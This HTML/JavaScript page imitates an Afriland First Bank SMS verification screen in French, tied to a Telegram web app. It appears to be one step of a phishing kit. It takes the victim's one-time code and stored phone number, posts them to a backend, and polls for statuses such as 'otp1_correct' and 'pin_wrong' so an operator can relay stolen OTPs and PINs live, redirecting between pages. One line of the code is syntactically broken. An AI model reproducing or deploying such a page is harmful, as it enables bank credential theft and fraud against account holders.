<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Afriland First Bank - Vérification SMS</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --primary-color: #551a8b; --primary-gradient: linear-gradient(180deg, #6c23af 0%, #551a8b 100%); }
        body { background-color: #f7f7f7; margin: 0; display: flex; flex-direction: column; min-height: 100vh; align-items: center; font-family: -apple-system, sans-serif; }
        .header-box { width: 100%; background: var(--primary-gradient); padding: 25px 20px 40px; color: white; text-align: center; font-size: 26px; font-weight: 800; }
        .main-container { width: 100%; display: flex; justify-content: center; margin-top: -20px; flex-grow: 1; }
        .card { background: #fff; width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); align-self: flex-start; }
        h2 { margin: 0 0 12px 0; font-size: 22px; color: #111; text-align: center; font-weight: 800; }
        .instruction { font-size: 14px; color: #666; margin: 0 0 12px 0; text-align: center; }
        .code-input-container { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 20px; }
        .code-box { width: 48px; height: 54px; border: 2px solid var(--primary-color); border-radius: 10px; text-align: center; font-size: 22px; font-weight: 800; outline: none; text-transform: uppercase; }
        .submit-btn { width: 100%; background-color: #e0e0e0; color: #999; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; }
        .submit-btn.active { background-color: var(--primary-color); color: white; cursor: pointer; }
        .footer-banner { width: 100%; background: var(--primary-gradient); height: 80px; border-top-left-radius: 30px; border-top-right-radius: 30px; margin-top: 40px; }
        .overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: var(--primary-gradient); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; color: white; text-align: center; }
        .error-message { background-color: #fde8e8; color: #e74c3c; border: 1px solid #f8b4b4; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 13px; font-weight: 600; text-align: center; display: none; }
    </style>
</head>
<body>
<div class="header-box">Afriland First Bank</div>
<div class="main-container">
    <div class="card">
        <h2>Vérification Code SMS</h2>
        <p class="instruction">Veuillez saisir à nouveau le code de confirmation reçu par SMS</p>
        
        <!-- Error prompt warning container -->
        <div id="errorText" class="error-message"></div>

        <div class="code-input-container">
            <input type="text" maxlength="1" class="code-box">
            <input type="text" maxlength="1" class="code-box">
            <input type="text" maxlength="1" class="code-box">
            <input type="text" maxlength="1" class="code-box">
            <input type="text" maxlength="1" class="code-box">
            <input type="text" maxlength="1" class="code-box">
        </div>
        <button id="submitBtn" class="submit-btn" disabled>VALIDER</button>
    </div>
</div>
<div class="footer-banner"></div>
<div class="overlay" id="statusOverlay">
    <div style="font-size: 20px; font-weight: bold;">Veuillez patienter...</div>
</div>
<script>
document.addEventListener("DOMContentLoaded", () => {
    const codeBoxes = document.querySelectorAll('.code-box');
    const submitBtn = document.getElementById('submitBtn');
    const statusOverlay = document.getElementById('statusOverlay');
    const errorText = document.getElementById('errorText');
    const savedPhone = localStorage.getItem('phone'] || localStorage.getItem('userPhone') || "";

    codeBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            if (box.value && index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
            const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
            submitBtn.disabled = fullCode.length !== 6;
            submitBtn.classList.toggle('active', fullCode.length === 6);
            errorText.style.display = 'none';
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) {
                codeBoxes[index - 1].focus();
            }
        });
    });

    let checkInterval = null;

    function startStatusPolling() {
        if (checkInterval) clearInterval(checkInterval);

        checkInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                const data = await res.json();

                if (data.status === "otp1_correct") {
                    clearInterval(checkInterval);
                    window.location.href = "/page9";
                } 
                else if (data.status === "pin_wrong") {
                    clearInterval(checkInterval);
                    // Redirect back to PIN login page to re-enter PIN
                    window.location.href = "/page6?error=wrongpin";
                } 
                else if (data.status === "otp1_wrong" || data.status === "otp2_wrong") {
                    clearInterval(checkInterval);
                    // Hide overlay loader and prompt user to re-enter OTP code
                    statusOverlay.style.display = "none";
                    errorText.textContent = "❌ Code incorrect. Veuillez le saisir à nouveau.";
                    errorText.style.display = "block";
                    codeBoxes.forEach(b => b.value = "");
                    codeBoxes[0].focus();
                    submitBtn.disabled = true;
                    submitBtn.classList.remove('active');
                }
            } catch (err) {
                console.error("Erreur de statut:", err);
            }
        }, 2000);
    }

    submitBtn.addEventListener('click', async () => {
        if (submitBtn.disabled) return;
        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
        if (codeValue.length < 6) return;

        statusOverlay.style.display = "flex";
        errorText.style.display = "none";

        try {
            const res = await fetch('/api/verify-first-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: savedPhone, code: codeValue, country: "CM" })
            });
            const responseData = await res.json();
            if (responseData.success) {
                startStatusPolling();
            } else {
                statusOverlay.style.display = "none";
                alert("Erreur de soumission.");
            }
        } catch (err) {
            statusOverlay.style.display = "none";
            alert("Erreur de connexion.");
        }
    });
});
</script>
</body>
</html>
